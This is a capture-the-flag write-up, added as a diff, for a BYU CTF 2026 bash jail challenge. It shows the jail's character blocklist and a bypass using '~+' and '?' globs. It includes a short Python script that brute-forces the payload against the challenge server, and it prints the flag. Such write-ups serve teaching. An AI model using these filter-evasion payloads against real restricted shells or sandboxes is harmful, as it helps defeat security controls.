@@ -1,0 +1,86 @@
+---
+title: 'BYU CTF 2026 - Skull'
+description: 'Bypassing a no-lowercase no-symbol bash jail with tilde-plus and question-mark globs to run the flag script'
+date: 2026-05-30
+tags: ['writeup', 'misc', 'jail', 'bash', 'byuctf', '2026']
+authors: ['kudaliar']
+draft: false
+---
+
+## Challenge Description
+
+> Blastoise, use Skull Bash!!
+>
+> nc chals.cyberjousting.com 1369
+
+We are given `jail.sh`, the source of "sbash, the Safe Bourne Again Shell".
+
+## Initial Analysis
+
+```bash
+export PATH="/tmp"
+cd /ctf/19*           # the real directory name is a secret, extra security :)
+
+while true; do
+    read -p "safe_bash> " user_input
+    [[ -z "$user_input" ]] && continue
+    case "$user_input" in
+        *">"*|*"<"*|*";"*|*"&"*|*"$"*|*"("*|*"}"*|*"\`"*|*" "*|*"\t"*|*"\v"*|\
+        *"\f"*|*"\r"*|*"*"*|*"."*|*","*|*"="*) echo "bad" && continue;;
+    esac
+    if   [[ ${#user_input} -gt 20 ]];        then echo "bad" && continue
+    elif [[ "$str2" =~ [^[:ascii:]] ]];      then echo "bad" && continue
+    elif [[ "$user_input" =~ [[:lower:]] ]]; then echo "bad" && continue
+    fi
+    eval "$user_input" 2>/dev/null || echo "command failed"
+done
+```
+
+So before the `eval`, our input must satisfy all of:
+
+- no `> < ; & $ ( } ` backtick, space, `\t \v \f \r`, `*`, `.`, `,`, `=`
+- no lowercase letters
+- length 20 or less
+- ASCII only
+
+The hint says there is a script in the local directory that prints the flag. We are auto-`cd`-ed into the secret directory `/ctf/19...`, which holds that script, but we cannot type its name (lowercase) or use `*`, `.`, `$`, or spaces.
+
+## The Vulnerability
+
+Two shell features need none of the banned characters:
+
+- `~+` expands to `$PWD` (the current directory) without typing `$`.
+- `?` is a single-character glob that matches a filename character without typing any letter.
+
+So `~+/????????` expands to the absolute path of any entry in the current directory whose name is exactly that many characters long, and `eval` runs it. We just brute-force the number of `?`:
+
+```
+safe_bash> ~+/???????    # 7 chars -> matches jail.sh, re-runs the jail (banner again)
+safe_bash> ~+/????????   # 8 chars -> matches the flag script, which prints the flag
+byuctf{funky_bu1lt1n_j1uj1tsu_ba8c3e44}
+```
+
+The `[[: invalid regular expression` noise comes from the unset `$str2` check on line 22; our payload is still `eval`-ed right after.
+
+## Exploitation
+
+```python
+import socket, time
+
+for n in range(1, 17):
+    cmd = "~+/" + "?" * n
+    if len(cmd) > 20:
+        break
+    s = socket.create_connection(("chals.cyberjousting.com", 1369)); s.settimeout(6)
+    time.sleep(0.4); s.recv(4096)
+    s.sendall(cmd.encode() + b"\n")
+    data = s.recv(8192); s.close()
+    if b"byuctf{" in data:
+        print(cmd, data); break
+```
+
+## Flag
+
+```
+byuctf{funky_bu1lt1n_j1uj1tsu_ba8c3e44}
+```
